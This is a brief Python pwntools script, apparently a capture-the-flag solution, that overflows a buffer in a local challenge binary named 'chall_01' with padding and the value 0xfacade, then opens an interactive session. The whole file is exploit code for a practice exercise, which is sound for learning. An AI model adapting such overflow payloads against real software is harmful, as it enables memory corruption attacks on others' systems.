# coding: utf-8
from pwn import *
p=process("./chall_01")
p.sendline()
p.sendline((0x60-0x4)*b"A"+p32(0xfacade))
p.interactive()
